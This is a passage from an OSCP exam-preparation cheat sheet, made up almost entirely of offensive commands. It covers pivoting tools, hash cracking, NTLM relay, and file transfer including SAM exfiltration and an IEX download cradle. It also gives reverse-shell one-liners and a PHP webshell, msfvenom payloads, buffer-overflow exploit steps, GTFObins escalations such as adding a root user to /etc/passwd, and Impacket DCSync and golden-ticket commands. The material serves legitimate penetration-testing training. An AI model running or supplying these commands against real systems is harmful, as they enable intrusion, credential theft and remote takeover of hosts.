    │                        xp_cmdshell on linked
    │                        → Shell on MS02/DC
    │
UNC injection → Responder → crack NetNTLMv2


# Pivoting & Tunneling

Ligolo-ng (Recommended for OSCP)

 ### 1. Attacker: create tun interface + start proxy:
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

### 2. Transfer agent to MS01 → connect:
 Windows:
certutil -urlcache -split -f http://<LHOST>/agent.exe agent.exe
.\agent.exe -connect <LHOST>:11601 -ignore-cert

### 3. In ligolo proxy console:
session; ifconfig; start

### 4. Add route to internal network:
sudo ip route add 10.10.10.0/24 dev ligolo


## Now attack MS02 directly!

nmap -sV 10.10.10.50

evil-winrm -i 10.10.10.50 -u user -p pass

### Expose internal port via listener:

listener_add --addr 0.0.0.0:8080 --to 10.10.10.50:80 --tcp

Ligolo-ng Double Pivot (MS01 → MS02 → MS03)

### After shell on MS02, expose ligolo port via listener on MS01:
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp

### On MS02:
.\agent.exe -connect <MS01_IP>:11601 -ignore-cert

### New session appears in proxy → start → add route:

sudo ip route add 172.16.0.0/24 dev ligolo

Plink (Windows — no SSH client)

certutil -urlcache -split -f http://<LHOST>/plink.exe plink.exe
cmd /c echo y | .\plink.exe -ssh -l root -pw <SSH_PASS> -R 127.0.0.1:4455:127.0.0.1:445 <LHOST>

### Attacker's 4455 → victim's 445

## Chisel
### Attacker:
./chisel server -p 8888 --reverse

### Victim:
.\chisel.exe client <LHOST>:8888 R:socks

### /etc/proxychains4.conf: socks5 127.0.0.1 1080

proxychains nmap -sT -Pn 10.10.10.50

proxychains evil-winrm -i 10.10.10.50 -u user -p pass

# SSH Tunneling

## Local port forward:
ssh -L 3389:10.10.10.50:3389 user@<MS01_IP>
xfreerdp /v:localhost:3389 /u:user /p:pass

## Dynamic SOCKS:
ssh -D 1080 -N user@<MS01_IP>
proxychains nmap -sT -Pn 10.10.10.0/24


# Password Attacks

Hashcat Modes Reference

Mode	Hash Type	Use Case

1000	NTLM	Windows local hashes

5600	NetNTLMv2	Responder captures

5500	NetNTLMv1	Older captures

13100	Kerberoast TGS-REP	SPN hash crack

18200	AS-REP Roast	AS-REP hash crack

1800	SHA512crypt $6$	Linux /etc/shadow

500	MD5crypt $1$	Linux shadow (older)

3200	bcrypt $2y$	Modern Linux/web

0	MD5	Web app hashes

hashcat -m 1000 ntlm.txt rockyou.txt

hashcat -m 5600 netntlm.txt rockyou.txt

hashcat -m 13100 tgs.txt rockyou.txt -r rules/best64.rule

hashcat -m 18200 asrep.txt rockyou.txt

hashcat -m 1800 shadow.txt rockyou.txt

NTLM Capture & Relay

### Capture (Responder):
sudo responder -I tun0 -dwv
hashcat -m 5600 Responder/logs/HTTP-NTLMv2-*.txt rockyou.txt

### Check signing:
netexec smb <SUBNET>/24 --gen-relay-list unsigned.txt

### Relay:
sudo python3 ntlmrelayx.py -tf unsigned.txt -smb2support

### Trigger auth via UNC, link, etc. → SAM dump or shell


## Online Brute Force

### SSH:
hydra -l root -P rockyou.txt ssh://<TARGET_IP> -t 4

### HTTP POST:
hydra -l admin -P rockyou.txt <TARGET_IP> http-post-form \
    "/login.php:username=^USER^&password=^PASS^:Invalid"

### SMB spray (check lockout first!):
crackmapexec smb <TARGET_IP> -u stephanie -p 'Password123' --pass-pol
crackmapexec smb <TARGET_IP> -u domain_users.txt -p 'Password123' --continue-on-success


# File Transfer Cheatsheet

## Linux → Windows

### PowerShell:
``IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1')
(New-Object Net.WebClient).DownloadFile('http://<LHOST>/file.exe','C:\Temp\file.exe')
Invoke-WebRequest -Uri http://<LHOST>/file.exe -OutFile C:\Temp\file.exe ``

### Certutil:
``certutil -urlcache -split -f http://<LHOST>/file.exe C:\Temp\file.exe``

### BITS:
``bitsadmin /transfer job /download /priority normal http://<LHOST>/file.exe C:\Temp\file.exe``

### SMB (setup on attacker):
``python3 /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support
copy \\<LHOST>\share\file.exe C:\Temp\
Windows → Linux (Exfil)``

### Via SMB:
``copy C:\Windows\System32\config\SAM \\<LHOST>\share\SAM``

### Base64 encode → copy/paste:
``[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\file.txt"))``

### Decode on attacker:
``echo '<BASE64>' | base64 -d > file.txt
Linux → Linux
python3 -m http.server 80
wget http://<LHOST>/file; curl http://<LHOST>/file -o file
scp file.txt user@<TARGET_IP>:/tmp/``

### Netcat:
``nc -lvnp 4444 > file          # receiver
nc <IP> 4444 < file           # sender
``

### Base64:
``base64 -w0 file.exe; echo '<B64>' | base64 -d > file.exe``

# Shells & Upgrades


## Reverse Shell One-Liners

### Bash:
``bash -i >& /dev/tcp/<LHOST>/4444 0>&1``

### Python3:
``python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<LHOST>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'``

### PHP webshell:
``<?php system($_GET["cmd"]); ?>``

### Netcat (mkfifo):
``rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> 4444 >/tmp/f``

### msfvenom payloads:
``msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f exe -o shell.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f aspx -o shell.aspx
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f war -o shell.war
Shell Upgrade — Linux TTY``

### Method 1: Python PTY (most reliable)
``python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm; stty rows 48 columns 190
``

### Method 2: Script
``script /dev/null -c bash``

### Then: Ctrl+Z → stty raw -echo; fg → export TERM=xterm

### Method 3: Socat (best quality)
### Attacker: socat file:`tty`,raw,echo=0 tcp-listen:4444
### Victim:   socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:4444

# Exploit Development (BOF Reference)

## Windows x86 Stack Buffer Overflow

### Step 1: Find crash size (fuzz in increments)

### Step 2: Exact offset
msf-pattern_create -l <CRASH_LENGTH>

#### Immunity: !mona findmsp -distance <CRASH_LENGTH>

### Step 3: Verify EIP control
#### payload = b"A" * OFFSET + b"B" * 4 + b"C" * (2000 - OFFSET - 4)
#### EIP = 42424242 ✓

### Step 4: Bad chars
#### !mona bytearray -b "\x00"
#### Send all chars; compare dump
#### !mona compare -f C:\mona\bytearray.bin -a <ESP_ADDRESS>

### Step 5: JMP ESP
#### !mona jmp -r esp -cpb "\x00\x0a\x0d"
#### Pick no-ASLR/DEP/SafeSEH module address

## Step 6: Shellcode
``msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 \
    -f python -b "\x00\x0a\x0d" EXITFUNC=thread``

## Step 7: Final exploit
``from struct import pack
payload = b"A" * offset + pack("<I", jmp_esp) + b"\x90" * 16 + shellcode``


# Common CVEs & Exploits
``
CVE / Exploit	Target	Impact
MS17-010 EternalBlue	Win7/2008 R2 (SMB v1)	→ SYSTEM
CVE-2019-0708 BlueKeep	Win7/2008 RDP	→ RCE/SYSTEM
CVE-2021-41773	Apache 2.4.49 PATH traversal	→ RCE
CVE-2021-3156 Baron Samedit	sudo < 1.9.5p2	→ local root
CVE-2021-4034 PwnKit	pkexec all distros	→ local root
CVE-2022-0847 DirtyPipe	kernel 5.8–5.16.11	→ local root
CVE-2016-5195 DirtyCow	kernel < 4.8.3	→ local root
CVE-2021-44228 Log4Shell	Log4j 2.x Java	→ RCE
CVE-2021-1675 PrintNightmare	Win2019/10	→ SYSTEM/RCE
CVE-2022-26134 Confluence	OGNL injection 7.4.17	→ RCE
SearchSploit Workflow
searchsploit apache 2.4
searchsploit "windows smb" remote
searchsploit -w openssh 7.2           # Show Exploit-DB URL
searchsploit -m 47837                 # Copy exploit to CWD
searchsploit -x 47837                 # Examine without copying
searchsploit -u                       # Update DB
``


# Exam Day Tips

Before Starting (15 min prep)

VPN connected — verify routing: ping <DC_IP>

Note all IPs: DC, MS01, MS02, Box1, Box2, Box3

Update /etc/hosts with all IPs

Create loot structure:
``mkdir -p ~/exam/{ad/{ms01,ms02,dc},box{1,2,3}}/{scans,loot,exploits,screenshots}``

Start nmap scans on ALL targets immediately

Open notes per machine (CherryTree / Obsidian)

Screenshot tool ready (Flameshot: flameshot gui)

Start tmux: 1 window per machine

Write provided AD credentials FIRST in notes

# Critical Exam Rules

## Every flag screenshot MUST show:

### Linux:
``cat /root/proof.txt && whoami && hostname && ip addr show``

### Windows:
``type C:\Users\Administrator\Desktop\proof.txt & whoami & hostname & ipconfig /all``

## Metasploit: ONLY 1 machine. Choose wisely — use on a stuck standalone, not on AD (manual AD is better for report anyway).

Stuck? 15-Point Reset Checklist

Did full port scan finish? (-p- not just top 1000)

Did UDP scan run? (SNMP=161 especially)

Read ALL web page source code? (Ctrl+U in browser)

Checked robots.txt, /.git, /.env, /backup?

Tried ALL found credentials on ALL services?

Default credentials tried? (admin:admin, admin:password)

Exact version numbers googled for CVEs?

searchsploit run on every service+version?

All SMB shares checked and files downloaded?

SQL injection tested on every input field?

LFI tested on every file/page parameter?

linpeas/winpeas output fully read? (especially yellow/red)

sudo -l, SUID, capabilities, cron all checked?

Interesting file search done? (.conf, .bak, history files)

Is there a simpler path I'm overthinking?

# AD-Specific Tips
``Start with provided creds → BloodHound FIRST
Check ALL user descriptions for passwords (very common in OSCP)
Check SYSVOL/GPP within the first 10 minutes
Kerberoast + AS-REP roast immediately
Password reuse is extremely common — spray everywhere
BloodHound "Shortest Path to DA" → follow it literally
Any GenericAll/WriteDACL/GenericWrite ACE → exploit immediately
Check MSSQL linked servers — common lateral movement path
After owning MS01 → re-run SharpHound from inside
Common Rabbit Holes (Avoid)
✗ Kernel exploits before trying anything else  |  ✗ SSH brute force with full rockyou  |  ✗ Ignoring UDP entirely  |  ✗ Spending >45 min on one vector  |  ✗ Forgetting PS history (ConsoleHost_history.txt)  |  ✗ Not checking web.config for DB creds  |  ✗ Giving up without GTFObins on every SUID
``

# Proof Collection Checklist

Required Screenshot Commands

### Linux local.txt (unprivileged):
``cat /home/<USERNAME>/local.txt && whoami && id && hostname && ip addr show``

### Linux proof.txt (root):
``cat /root/proof.txt && whoami && id && hostname && ip addr show``

### Windows local.txt:
``type C:\Users\<USERNAME>\Desktop\local.txt & whoami & hostname & ipconfig``

### Windows proof.txt (SYSTEM / Administrator):
``type C:\Users\Administrator\Desktop\proof.txt & whoami /all & hostname & ipconfig /all``

### If not found:
``find / -name "*.txt" 2>/dev/null | xargs grep -l "OS{" 2>/dev/null
dir /s /b C:\*.txt 2>nul | findstr "local\|proof"``

#  Points Tracker
``Machine	Flag	Points	Flag Value	Screenshot
AD MS01	local.txt	10 pts	____________	☐
AD MS02	local.txt	10 pts	____________	☐
AD DC01	proof.txt	20 pts	____________	☐
Box 1	local.txt	10 pts	____________	☐
Box 1	proof.txt	10 pts	____________	☐
Box 2	local.txt	10 pts	____________	☐
Box 2	proof.txt	10 pts	____________	☐
Box 3	local.txt	10 pts	____________	☐
Box 3	proof.txt	10 pts	____________	☐
TOTAL: ___ / 100 pts  |  PASS THRESHOLD: 70 pts
Pre-Report Checks
All screenshots show: flag + whoami + hostname + IP
Notes detailed enough to recreate each attack step
All commands documented for 24hr report
Metasploit NOT used on more than 1 machine
Report template ready
``

# Quick Reference Card
```Listeners
nc -lvnp 4444
rlwrap nc -lvnp 4444      ## With readline
Impacket Cheatsheet
psexec.py dom/user:pass@<IP>                          ## SYSTEM via SMB
wmiexec.py dom/user:pass@<IP>                         ## semi-interactive WMI
smbexec.py dom/user:pass@<IP>                         ## no binary on disk

### Hash (PTH):
psexec.py dom/user@<IP> -hashes :<NTLM_HASH>
wmiexec.py dom/user@<IP> -hashes :<NTLM_HASH>

### AD attacks:
GetUserSPNs.py dom/user: pass -dc-ip <DC_IP> -request   # Kerberoast
GetNPUsers.py dom/user: pass -dc-ip <DC_IP> -request    # AS-REP
secretsdump.py dom/user:pass@<DC_IP> -just-dc          # DCSync
getST.py -spn cifs/<FQDN> -impersonate Admin dom/user:pass  # S4U2Self
ticketer.py -nthash <KRBTGT_HASH> -domain-sid <SID> -domain dom Admin
netexec (nxc) Cheatsheet
nxc smb <IP> -u user -p pass                            # Test creds
nxc smb <IP> -u user -H <NTLM_HASH>                    # PTH
nxc smb <SUBNET>/24 -u user -p pass --continue-on-success
nxc smb <IP> -u user -p pass --shares --users --pass-pol
nxc smb <IP> -u user -p pass --sam --lsa
nxc smb <IP> -u user -p pass -M lsassy
nxc smb <IP> -u user -p pass -M gpp_password
nxc smb <IP> -u user -p pass -x "whoami."
nxc winrm <IP> -u user -p pass
nxc mssql <IP> -u sa -p pass --local-auth
nxc mssql <IP> -u sa -p pass -q "SELECT @@version"
GTFObins Quick Reference
sudo find . -exec /bin/bash \; -p
python3 -c 'import os; os.execl("/bin/bash","bash","-p")'
perl -e 'exec "/bin/bash"'
awk 'BEGIN {system("/bin/bash")}'
sudo vim -c ':!/bin/bash'
sudo less /etc/hosts → !/bin/bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
echo 'root2::0:0::/root:/bin/bash' | sudo tee -a /etc/passwd
Key File Locations
OS	Path	Why
Linux	/etc/shadow	Hashes
Linux	/home/*/.bash_history	Command history (GOLD)
Linux	/home/*/.ssh/id_rsa	Private keys
Linux	/var/www/html/	Web configs / DB creds
Windows	C:\Windows\System32\config\SAM	Local hashes
Windows	C:\Windows\NTDS\ntds.dit	AD hashes (DC)
Windows	C:\inetpub\wwwroot\web.config	DB/app creds
Windows	PSReadLine\ConsoleHost_history.txt	PS history (GOLD)
Windows	C:\Windows\Panther\unattend.xml	Autologon creds
